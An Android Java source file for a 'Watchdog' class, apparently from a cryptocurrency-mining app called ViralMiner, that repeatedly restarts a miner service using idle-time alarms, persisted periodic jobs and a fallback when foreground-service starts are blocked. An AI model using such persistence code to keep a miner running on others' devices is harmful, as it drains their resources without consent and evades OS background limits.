package com.viralminer;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;

public final class Watchdog {

    private static final String TAG = "ViralMiner";
    private static final int  JOB_ID = 4242;
    private static final long EVERY  = 15 * 60 * 1000L;

    public static void ensureRunning(Context ctx) { ensureRunning(ctx, false); }

    public static void ensureRunning(Context ctx, boolean force) {
        SharedPreferences p = ctx.getSharedPreferences("viral", Context.MODE_PRIVATE);
        if (force) p.edit().putBoolean("paused", false).apply();
        else if (p.getBoolean("paused", false)) return;

        if (MinerService.isRunning) return;

        try {
            Intent i = new Intent(ctx, MinerService.class);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
            Log.d(TAG, "watchdog -> service start");
        } catch (Throwable t) {
            Log.w(TAG, "FGS blocked, fallback: " + t);
            try { ctx.startService(new Intent(ctx, MinerService.class)); } catch (Throwable ignored) { }
        }
    }

    public static void schedule(Context ctx) {
        scheduleAlarm(ctx);
        scheduleJob(ctx);
    }

    private static void scheduleAlarm(Context ctx) {
        try {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, 99,
                    new Intent(ctx, WatchdogReceiver.class),
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            long at = SystemClock.elapsedRealtime() + EVERY;
            if (Build.VERSION.SDK_INT >= 23) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi);
            }
        } catch (Throwable t) { Log.w(TAG, "alarm " + t); }
    }

    private static void scheduleJob(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            JobInfo job = new JobInfo.Builder(JOB_ID, new ComponentName(ctx, WatchdogJob.class))
                    .setPeriodic(EVERY)
                    .setPersisted(true)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
                    .build();
            js.schedule(job);
        } catch (Throwable t) { Log.w(TAG, "job " + t); }
    }
}
